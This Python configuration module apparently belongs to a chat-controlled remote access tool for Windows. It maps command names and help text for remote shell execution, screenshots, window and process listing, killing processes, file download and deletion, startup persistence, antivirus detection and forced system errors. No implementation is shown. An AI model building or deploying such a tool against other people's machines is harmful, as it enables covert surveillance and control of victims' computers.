"""
[MainC]: AllCommands
[KeyboardC]: commands for keyboard generating
[Log]: Output
"""

# MainC values can be changed
MainC = {
    "AddUser": "AddUser",
    "DelUser": "DeleteUser",
    "GetUsers": "GetUsersList",
    "Hotkey": "NewButton",
    "GetLog": "GetApiLog",
    "Stop": "StopPolling",
    "Cmd": "$",
    "CallSysFunc": "CallSystem",
    "DownloadFile": "DownloadFile",
    "DelFile": "DeleteFile",
    "Say": "Say",
    "GetActWinT": "GetActiveWindowTitle",
    "GetAllWinT": "GetAllWinTitles",
    "Screenshot": "GetScreenshot",
    "GetSysMtr": "GetSystemMetrics",
    "GetUserName": "GetCurrentUser",
    "GetCPName": "GetComputerName",
    "CallHardSysE": "CallHardSystemError",
    "monitor": "Monitor",
    "GetPRCS": "GetProcesses",
    "KillPRCS": "KillProcess",
    "FindPRCS": "FindProcess",
    "MsgBox": "Messagebox",
    "startup": "StartupAdd",
    "GetANM": "GetAntivirus",
    "ResetK": "ResetKeyboard",
    "cdrom": "Cdrom",
    "mkdir": "CreateDir"
}

KeyboardC = [MainC['Stop'], MainC['GetLog'], MainC['CallSysFunc'] + " shutdown", MainC['CallSysFunc'] + " restart",
             MainC['GetUsers'], MainC['GetCPName'], MainC['GetUserName'], MainC['Screenshot'], MainC['GetAllWinT'],
             MainC['GetActWinT'], MainC['CallHardSysE'], MainC['monitor'] + " on", MainC['monitor'] + " off",
             MainC['GetPRCS'], "Functions", MainC["startup"], MainC['cdrom'] + " open", MainC['cdrom'] + " close",
             MainC['GetANM']]


Log = f"""Functions
/{MainC['GetActWinT']}
/{MainC['GetSysMtr']}
/{MainC['GetAllWinT']}
/{MainC['GetUserName']}
/{MainC['GetCPName']}
/{MainC['Screenshot']}
/{MainC['GetPRCS']}
/{MainC['GetUsers']}
/{MainC['GetANM']}

Processes
/{MainC['KillPRCS']} [pattern]
/{MainC['FindPRCS']} [name.exe]

System️
/{MainC['MsgBox']} [count] [title] (TEXT)
/{MainC['Cmd']} (command)
/{MainC['cdrom']} [open/close]

Other
/{MainC['Say']} [rate] [0/1/2] [0.0-1.0] (text)
/{MainC['DelFile']} (path)
/{MainC['DownloadFile']} (path)
/{MainC['Hotkey']} (func with args)
/{MainC['mkdir']} [path]
/{MainC['ResetK']}

Only Admin
/{MainC['AddUser']} [id] [name]
/{MainC['DelUser']} [id]
/{MainC['monitor']} [on/off]
/{MainC['CallSysFunc']} [restart/shutdown]
/{MainC['CallHardSysE']}
/{MainC['startup']}
/{MainC['Stop']} 

             << Release Notes >>
> Send file if you want to install it. 
> ".mp3" files playing automatically.
> Admin can add new users.
> Photo type files is using like wallpapers.
> Message caption using like installation path.
> Use "/NewButton (text)" to create a button. 

[args] - [1 arg] without tabs 
(args) - [Text] with tabs
"""
